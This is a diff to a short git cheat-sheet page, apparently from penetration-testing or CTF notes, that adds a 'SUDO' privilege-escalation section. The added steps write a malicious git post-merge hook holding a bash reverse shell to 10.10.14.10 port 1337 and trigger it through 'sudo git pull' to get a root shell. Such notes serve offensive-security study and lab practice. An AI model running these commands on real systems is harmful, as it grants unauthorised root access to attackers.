@@ -1,7 +1,7 @@
 ---
 title: "git"
 date: 2024-6-28
-tags: ["git", "git-dumper"]
+tags: ["git", "git-dumper", "sudo", "privesc"]
 ---
 
 ---
@@ -42,6 +42,29 @@ git diff [a] [b]
 # Show commit
 git show 'commit_hash'
 ```
+
+<br>
+
+---
+
+### SUDO
+
+```bash
+# Copy target project
+cp -r /var/www/html/project .
+```
+
+```bash
+# Create a malicious post-merge
+echo -e '#!/bin/bash\n\nbash -i >& /dev/tcp/10.10.14.10/1337 0>&1' > ./project/.git/hooks/post-merge
+```
+
+```bash
+# Run
+sudo /usr/bin/git pull
+```
+
+<small>*Note: Make changes to the project to make the pull work*</small>
 
 <br>
 
